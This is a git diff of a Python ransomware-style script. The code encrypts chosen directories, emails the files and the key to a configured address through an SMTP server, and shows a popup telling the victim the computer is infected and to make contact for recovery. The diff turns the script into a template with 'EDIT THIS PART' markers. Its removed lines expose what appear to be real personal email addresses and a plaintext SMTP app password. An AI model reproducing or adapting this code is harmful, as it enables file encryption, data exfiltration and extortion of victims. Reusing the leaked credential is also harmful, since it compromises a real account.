@@ -74,18 +74,23 @@ def encrypt_directory(directory_path, cipher_suite):
             encrypt_file(file_path, cipher_suite)
 
 # Set the paths to encrypt
-directory1 = 'C:\\Users\\limbo\\onedrive\\Desktop\\Folder1'  # Customize this path
-directory2 = 'C:\\Users\\limbo\\onedrive\\Desktop\\Folder2'  # Customize this path
+directory1 = 'C:\\path\\to\\files\\to\\be\\ciphered'  # Customize this path
+directory2 = 'C:\\do\\the\\same\\here'  # Customize this path
 
-# Email and SMTP settings for iCloud
-subject = "PYTHON CODE FILES poopeth"
+# Email and SMTP settings for your email provider
+subject = "PYTHON CODE FILES POOPETHEEEEEE"
 body = "Here are the files and below are the files that are backed up."
-to_email = "limbolotus112311@gmail.com"
-from_email = "cgoodn@icloud.com"  # Use this email as the sender
-smtp_server = "smtp.mail.me.com"
+
+# EDIT THIS PART!!!!!!
+
+to_email = "send files and key to here@example.com"
+from_email = "Insertsender@example.com"  # Use this email as the sender
+smtp_server = "smtp.mail.me.com" # icloud smtp server
 smtp_port = 587
-smtp_user = "cgoodn@icloud.com"
-smtp_password = "iyfe-enwh-sbdi-trpo"  # Use your app-specific password
+smtp_user = "Insertsender@example.com"
+smtp_password = "password"  # Use password for sender account
+
+# STOP EDITING HERE!!!!!!!!
 
 # Send the backup email
 files_to_send = [os.path.join(root, file_name) for directory in [directory1, directory2] for root, _, files in os.walk(directory) for file_name in files]
@@ -102,6 +107,8 @@ for directory in [directory1, directory2]:
 def show_popup():
     root = tk.Tk()
     root.withdraw()
-    messagebox.showinfo("Notification", "Your computer is now infected with poopedethdeeeeeeee. Your program files are encrypted and replaced. Contact the email address provided for recovery instructions.")
-
+    messagebox.showinfo("Notification", "Your computer is now infected with poopedethdeeeeeeee. Your filenameorpath files are encrypted and replaced. Contact emailhere for recovery instructions.")
+                                                                                                     # EDIT ABOVE!!
 show_popup()
+
+# You would then use the key.key file and the decipher.py app to return the files back to normal. 
